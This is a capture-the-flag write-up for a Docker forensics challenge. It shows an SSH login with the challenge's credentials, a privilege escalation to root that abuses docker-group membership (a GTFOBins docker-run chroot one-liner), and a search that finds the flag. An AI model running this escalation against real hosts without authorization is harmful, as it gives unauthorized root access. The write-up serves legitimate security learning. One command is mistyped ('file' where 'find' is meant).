# Donnie Docker | Forensics

### Solution

From ctf description we have got credentials to ssh connection:
```bash
$ ssh user@chals2.umdctf.io -p 5000
password: umdctf
```

After successful login with given credentials, I saw docker machine.<br>
Firstly I checked some basic stuff I am ( **pwd** command ) and to which groups I belong ( **id** command ).<br>
```bash
$ pwd
/home/user

$ id
uid=1000(user) gid=1000(user) groups=1000(user), 999(docker)
```

I saw that I belong to **docker** group, so I follow this lead. I assume If I am in this group I probably could use docker commands. From previous ctf's I known some cool [website](https://gtfobins.github.io/gtfobins/docker/#shell) where I found how to get root shell with privileges to run docker

```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Running command above resulted with root account that gives me access to everything inside docker container. <br>

Now I have to find file with flag.
```bash
$ file / -name *.txt 2>/dev/null
...
/var/lib/docker/vfs/dir/c53fadd9c7a3f33d711b573de585b367e45d6a4de64e677ab8ffc1bf6112fbff/flag.txt  
/var/lib/docker/vfs/dir/c53fadd9c7a3f33d711b573de585b367e45d6a4de64e677ab8ffc1bf6112fbff-init/flag.txt  
/var/lib/docker/vfs/dir/9a2432327f4d149162a06da63a797e0b88a8c2bccac598f262ebb6d073b9ecda/flag.txt

$ cat /var/lib/docker/vfs/dir/9a2432327f4d149162a06da63a797e0b88a8c2bccac598f262ebb6d073b9ecda/flag.txt
UMDCTF-{h1dd3n_1m@g35}
```
